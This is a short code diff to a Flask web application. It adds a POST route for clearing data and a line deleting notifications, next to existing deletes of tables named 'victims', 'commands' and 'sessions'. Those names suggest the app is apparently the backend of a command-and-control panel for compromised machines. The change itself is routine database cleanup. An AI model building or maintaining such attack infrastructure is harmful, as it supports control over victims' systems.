@@ -1770,6 +1770,8 @@ def api_notification_details(notification_id):
     except Exception as e:
         log_activity(f"❌ Error in api_notification_details: {e}")
         return jsonify({'error': str(e)}), 500
+@app.route('/api/clear-data', methods=['POST'])
+
 def api_clear_data():
     """Clear all data from database"""
     try:
@@ -1780,6 +1782,7 @@ def api_clear_data():
         cursor.execute('DELETE FROM victims')
         cursor.execute('DELETE FROM commands')
         cursor.execute('DELETE FROM sessions')
+        cursor.execute('DELETE FROM notifications')
         
         conn.commit()
         conn.close()
